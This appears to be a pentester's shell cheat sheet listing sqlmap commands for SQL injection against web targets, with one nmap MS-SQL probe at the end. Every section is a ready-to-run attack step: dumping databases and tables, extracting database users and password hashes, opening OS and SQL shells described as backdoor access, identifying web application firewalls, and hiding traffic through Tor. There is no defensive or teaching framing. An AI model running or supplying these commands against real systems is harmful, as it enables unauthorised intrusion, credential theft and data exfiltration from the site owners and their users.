#!/bin/sh


##-=========================-##
##    [+] Targeted sqlmap scan
##-=========================-##
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump


##-=========================================================-##
##    [+] Scan url for union + error based injection with mysql backend 
##         use a random user agent + database dump 
##-=========================================================-##
sqlmap -o -u http://$ip/index.php --forms --dbs
sqlmap -o -u "http://$ip/form/" --forms


##-==================================-##
##    [+] Sqlmap check form for injection  
##-==================================-##
sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump


##-========================-##
##    [+] Enumerate databases  
##-========================-##
sqlmap --dbms=mysql -u "$URL" --dbs


##-=========================================-##
##    [+] Enumerate tables from a specific database  
##-=========================================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables


##-================================================-##
##    [+] Dump table data from a specific database and table  
##-================================================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump


##-==============================-##
##    [+] Specify parameter to exploit     
##-==============================-##
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2


##-=======================================================-##
##    [+] Specify parameter to exploit in 'nice' URIs (exploits param1)
##-=======================================================-##
 sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs


##-=================-##
##    [+] Get OS shell  
##-=================-##
sqlmap --dbms=mysql -u "$URL" --os-shell


##-==================-##
##    [+] Get SQL shell  
##-==================-##
sqlmap --dbms=mysql -u "$URL" --sql-shell


##-===============-##
##    [+] SQL query  
##-===============-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"


##-=========================-##
##    [+] Use Tor Socks5 proxy
##-=========================-##
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs



##-==========================-##
##    [+] Automated sqlmap scan
##-==========================-##
sqlmap -u http://site.com--forms --batch --crawl=2 --cookie= --level=5 --risk=3

##-=====================================-##
##    [+] Test URL and POST data
##    [+] Return database banner (if possible)
##-=====================================-##
sqlmap --url="<url>" --data="<post-data>" --banner

##-=============================-##
##    [+] Parse request data and test
##-=============================-##
## -------------------------------------------------------------------- ##
##    [?] request data can be obtained with burp
## -------------------------------------------------------------------- ##
sqlmap -u <request-file> <options>

##-======================-##
##    [+] Use random agent 
##-======================-##
sqlmap -u <request-file> --random-agent

##-===============================================-##
##    [+] Fingerprint | much more information than banner
##-===============================================-##
sqlmap -u <request-file> --fingerprint

##-=================-##
##    [+] Identify WAF
##-=================-##
sqlmap -u <request-file> --check-waf/--identify

##-============================================-##
##    [+] Get database username, name, and hostname
##-============================================-##
sqlmap -u <request-file> --current-user --current-db --hostname

##-==================================-##
##    [+] Check if user is a database admin
##-==================================-##
sqlmap -u <request-file> --is-dba

##-=========================================-##
##    [+] Get database users and password hashes
##-=========================================-##
sqlmap -u <request-file> --users --passwords

##-========================-##
##    [+] Enumerate databases
##-========================-##
sqlmap -u <request-file> --dbs

##-=============================-##
##    [+] List tables for one database
##-=============================-##
sqlmap -u <request-file> -D <db-name> --tables

##-============================-##
##    [+] Other database commands
##-============================-##
sqlmap -u <request-file> -D <db-name> --columns --schema --count

##-=====================-##
##    [+] Enumeration flags
##-=====================-##
sqlmap -u <request-file> -D <db-name> -T <tbl-name> -C <col-name> -U <user-name>

##-================-##
##    [+] Extract data
##-================-##
sqlmap -u <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump

##-======================-##
##    [+] Execute SQL Query
##-======================-##
sqlmap -u <request-file> --sql-query="<sql-query>"

##-===============================-##
##    [+] Append/Prepend SQL Queries
##-===============================-##
sqlmap -u <request-file> --prefix="<sql-query>" --suffix="<sql-query>"

##-======================================================-##
##    [+] Get backdoor access to sql server | can give shell access
##-======================================================-##
sqlmap -u <request-file> --os-shell







nmap -sU --script=ms-sql-info $TARGET


